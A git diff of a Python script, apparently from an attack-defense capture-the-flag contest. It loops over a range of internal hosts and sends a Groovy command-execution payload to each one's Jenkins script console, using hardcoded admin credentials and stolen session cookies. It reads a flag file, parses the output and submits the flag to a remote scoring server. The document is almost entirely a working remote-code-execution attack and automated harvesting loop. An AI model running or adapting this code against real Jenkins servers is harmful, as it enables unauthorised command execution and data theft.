@@ -27,43 +27,77 @@ def attack():
     }
     
     s = requests.Session()
-    # login("admin", "12345qwert", s )
-    LOGIN_INFO = {
-        'j_username': "admin",
-        'j_password': "12345qwert",
-        'from': "/",
-        'Submit':'%EB%A1%9C%EA%B7%B8%EC%9D%B8'
-    }
+    # # login("admin", "12345qwert", s )
+    # LOGIN_INFO = {
+    #     'j_username': "admin",
+    #     'j_password': "12345qwert",
+    #     'from': "/",
+    #     'Submit':'%EB%A1%9C%EA%B7%B8%EC%9D%B8'
+    # }
     
     
-    login_req = s.post('http://10.10.1.15:30006/login', data=LOGIN_INFO, verify=False)
+    # login_req = s.post('http://10.10.1.15:30006/login', data=LOGIN_INFO, verify=False)
     
-    print(login_req.text)
+    # print(login_req.text)
     # res = s.get("http://10.10.1.2:30006/")
     # print(res.text)
     
-    # script_info = {
-    #     'script': "cat /flag/flag.txt",
-    # }
     
-    # res = s.post(url, data=script_info, headers=headers)
-    # print(res.text)
+  
+    for i in range(2, 17):
+        try:
+            url = "http://10.10.1." + str(i) + ":30006/computer/(master)/script"
+            cookies = {
+                'JSESSIONID.2f820394' : 'node0avx8s2wf7x1a3fjuua1ew6yp310.node0',
+                'JSESSIONID.6d64b7fa' : 'node01gmtlbmq1ib2w10yetwk7g7kmq292.node0',
+                'JSESSIONID.2d33700b' : 'node01hncu1zja4z1288cdj20vnnq286.node0',
+                'JSESSIONID.92c8e7ff' : 'node0k18d7jhzzasgawcdbt2apssy278.node0',
+                'JSESSIONID.f7bda4fe' : 'node0b4pyspffrxe21qaree2gq2ntg298.node0',
+                'JSESSIONID.4ba8eaef' : 'node01poffgthtijil1q0zu26jns150300.node0',
+                'JSESSIONID.5297bc20' : 'node0i6dp1urabkhtfotjf4wvyoks289.node0',
+                'JSESSIONID.7b251389' : 'node0ym8j9i2mpm491nnfsvahus3mw298.node0',
+                'JSESSIONID.96e54484' : 'node015spqtbm0hu0z7lgzsuvg9w70293.node0',
+                'JSESSIONID.447e2638' : 'node0dj5f01inynz2sxo8k0pezc0a287.node0',
+                
+            }
+            
+            script_info = {
+                'script': 'println "cat /flag/flag.txt".execute().text',
+            }
+            
+            res = s.post(url, cookies=cookies, data=script_info, headers=headers)
+            
+            pos = res.text.find("결과</h2><pre>") + len("결과</h2><pre>")
+            if pos == -1:
+                continue
+            res.text[pos: pos+64]
+            if len(res.text[pos: pos+64]) != 64:
+                continue
+            if "<" in res.text[pos: pos+64]:
+                continue
+            flag = res.text[pos: pos+64]
+            print(flag)
+            
 
-    # cookies = {
-    #     'session': 'eyJ0ZWFtX2lkeCI6MX0.Y7_-KQ.-HgRrXK0SVI-UwIjSBWIi5yqPG8',
-    # }
+            headers = {
+                'Accept': '*/*',
+                'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
+                'Connection': 'keep-alive',
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                # 'Cookie': 'session=eyJ0ZWFtX2lkeCI6MX0.Y7_-KQ.-HgRrXK0SVI-UwIjSBWIi5yqPG8',
+                'Origin': 'http://15.165.15.245',
+                'Referer': 'http://15.165.15.245/',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
+                'X-Requested-With': 'XMLHttpRequest',
+            }
+            session = "eyJ0ZWFtX2lkeCI6MX0.Y8Cfgg.zgqLfuvqkANsT1MTDvPBeeFtGos",
+            flag_shooter.auth("http://3.38.255.21", flag, session)
+            
+        except:
+            continue
+    
 
-    # headers = {
-    #     'Accept': '*/*',
-    #     'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
-    #     'Connection': 'keep-alive',
-    #     'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    #     # 'Cookie': 'session=eyJ0ZWFtX2lkeCI6MX0.Y7_-KQ.-HgRrXK0SVI-UwIjSBWIi5yqPG8',
-    #     'Origin': 'http://15.165.15.245',
-    #     'Referer': 'http://15.165.15.245/',
-    #     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
-    #     'X-Requested-With': 'XMLHttpRequest',
-    # }
+    
 
     # data = 'flag=여기채우면됨~~'.encode()
     # round = flag_manager.get_round()
